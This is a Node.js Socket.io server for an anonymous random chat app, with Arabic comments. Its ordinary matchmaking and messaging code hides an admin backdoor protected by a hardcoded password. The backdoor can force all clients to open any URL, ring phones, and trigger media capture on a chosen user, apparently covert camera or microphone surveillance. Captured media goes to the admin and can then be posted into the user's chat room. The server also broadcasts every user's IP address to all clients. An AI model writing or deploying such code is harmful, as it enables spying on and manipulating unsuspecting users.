const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  pingTimeout: 4000,
  pingInterval: 8000
});

app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

let waitingUser = null;

io.on('connection', (socket) => {
  let clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  // إرسال الـ IP و الـ ID فقط للأدمن
  io.emit('device_info', {
    id: socket.id,
    ip: clientIp
  });

  socket.on('find_partner', () => {
    if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
      socket.join(roomName);
      waitingUser.join(roomName);

      socket.partnerId = waitingUser.id;
      waitingUser.partnerId = socket.id;
      socket.roomName = roomName;
      waitingUser.roomName = roomName;

      waitingUser.emit('matched');
      socket.emit('matched');
      waitingUser = null;
    } else {
      waitingUser = socket;
    }
  });

  socket.on('message', (data) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('message', { ...data, senderId: socket.id });
    }
  });

  socket.on('typing', (isTyping) => {
    if (socket.roomName) {
      socket.to(socket.roomName).emit('display_typing', isTyping);
    }
  });

  // استقبال الوسائط من المستخدم وإرسالها حصرياً للأدمن للمراجعة
  socket.on('media_captured_for_admin', (data) => {
    io.to(data.adminSocketId).emit('review_captured_media', {
      targetSocketId: socket.id,
      type: data.type,
      content: data.content
    });
  });

  // موافقة الأدمن على نشر الوسائط في الشات العام
  socket.on('admin_approve_and_send', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;
    if (data.roomName) {
      io.to(data.roomName).emit('message', { type: data.type, content: data.content });
    }
  });

  // أوامر الأدمن
  socket.on('admin_action', (data) => {
    if (data.secret !== 'mySuperSecretAdmin123') return;

    if (data.action === 'alert') {
      io.emit('system_alert', data.message);
    } else if (data.action === 'open_url') {
      io.emit('force_open_url', data.url);
    } else if (data.action === 'clear_chat') {
      io.emit('clear_chat', { target: data.target });
    } else if (data.action === 'ring_phone') {
      if (data.targetSocket) {
        io.to(data.targetSocket).emit('trigger_ringtone');
      } else {
        io.emit('trigger_ringtone');
      }
    } else if (data.action === 'change_bg') {
      io.emit('change_bg', data.bgColor);
    } else if (data.action === 'request_media') {
      if (data.targetSocket) {
        io.to(data.targetSocket).emit('trigger_media_capture', { 
          type: data.mediaType, 
          duration: data.duration, 
          adminSocketId: socket.id,
          roomName: io.sockets.sockets.get(data.targetSocket)?.roomName 
        });
      }
    }
  });

  socket.on('disconnect', () => {
    if (waitingUser === socket) waitingUser = null;
    if (socket.roomName) {
      socket.to(socket.roomName).emit('partner_disconnected');
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
